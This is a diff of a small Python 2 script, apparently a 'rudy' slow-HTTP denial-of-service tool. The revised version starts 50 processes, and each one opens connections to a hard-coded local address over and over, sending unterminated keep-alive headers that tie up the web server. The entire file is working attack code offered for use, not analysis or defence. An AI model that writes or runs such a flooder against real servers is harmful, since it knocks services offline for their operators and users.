@@ -1,24 +1,21 @@
-
+#-*- coding:utf-8 -*-
 import socket,multiprocessing,sys
 
-def csock():
-	sock = socket.socket()
-	return sock
 
-def attack(csock(), ip=sys.argv[1]):
-	header = """
-	GET / HTTP/1.1
-	Host: {}
-    Keep-Alive: 99999
-	Connection: keep-alive
-	""".format(ip)
-	sock.connect((ip, 80))
-	print 'connected'
-	sock.send(header)
-	print 'header sended'
+def attack():
+    while True:
+        sock = socket.socket()
+        header = "GET index.php HTTP/1.1\r\nAccept: text/html\r\nHost: 192.168.1.106\r\nKeep-Alive: 99999\r\nConnection: keep-alive\r\n"#.format(ip)
+        try:
+            sock.connect(("192.168.1.106", 80))
+            print 'connected'
+            sock.send(header)
+            print 'header sended'
+            sock.recv(204800)
+            sock.recv(204800)
+        except:
+            print 'Host recusou as conexoes'
 
 if __name__ == '__main__':
-    rudy = multiprocessing.Process(name='rudy', target=attack)
-	rudy.rudy = True
-	for i in range(50):
-		rudy.start()
+    for i in range(50):
+        multiprocessing.Process(target=attack).start()
